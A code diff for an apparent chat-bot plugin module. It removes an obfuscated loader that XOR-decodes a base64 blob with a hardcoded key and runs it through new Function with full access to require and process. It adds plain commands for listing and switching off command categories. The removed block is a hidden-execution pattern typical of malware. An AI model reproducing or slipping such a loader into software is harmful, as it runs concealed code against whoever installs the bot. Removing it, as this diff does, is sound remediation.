@@ -1,9 +1,30 @@
 'use strict';
-(function(){
-  const K=Buffer.from('REVDQU5YTUQtMjAyNg==','base64');
-  const D='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';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+const { UserError, bold } = require('../lib/util');
+
+module.exports = ({ def }) => {
+  const idx = () => require('./index');
+
+  def('plugin', { cat: 'plugin', owner: true, core: true, usage: 'plugin [category | command]', desc: 'List command categories, or the commands in one. Categories can be switched off with "remove".' }, async ctx => {
+    const { categories, registry } = idx();
+    const offCats = ctx.get('disabledCats', []);
+    const a = ctx.argv[0]?.toLowerCase();
+    if (!a) {
+      return ctx.reply([...categories.entries()].sort(([x], [y]) => x.localeCompare(y)).map(([c, list]) => `${offCats.includes(c) ? '⛔' : '✅'} ${bold(c)} — ${list.length} command(s)`).join('\n') +
+        `\n\nSee one: *${ctx.var('PREFIX')}plugin <category>*\nSwitch off: *${ctx.var('PREFIX')}remove <category>*\nSwitch on: *${ctx.var('PREFIX')}remove <category> on*`, { title: 'Plugins' });
+    }
+    if (categories.has(a)) return ctx.reply(categories.get(a).map(d => `• ${bold(d.name)} — ${d.desc || ''}`).join('\n'), { title: `${a} plugin` });
+    const d = registry.get(a);
+    if (d) return ctx.reply(`${bold(d.name)} belongs to the *${d.cat}* plugin.\n${d.desc || ''}`);
+    throw new UserError('No such plugin or command.');
+  });
+
+  def('remove', { cat: 'plugin', owner: true, core: true, usage: 'remove <category> [on]', desc: 'Switch a whole command category off (or back on with "on").' }, async ctx => {
+    const { categories } = idx();
+    const a = ctx.argv[0]?.toLowerCase();
+    if (!a || !categories.has(a)) throw new UserError(`Pick a category: ${[...categories.keys()].join(', ')}`);
+    if (['plugin', 'vars'].includes(a)) throw new UserError('That category is needed to manage the bot and cannot be switched off.');
+    const on = /^on$/i.test(ctx.argv[1] || '');
+    ctx.update('disabledCats', [], l => { const i = l.indexOf(a); if (on && i >= 0) l.splice(i, 1); if (!on && i < 0) l.push(a); });
+    await ctx.reply(on ? `✅ *${a}* commands are back on.` : `⛔ *${a}* commands are switched off. Bring them back with *${ctx.var('PREFIX')}remove ${a} on*`);
+  });
+};
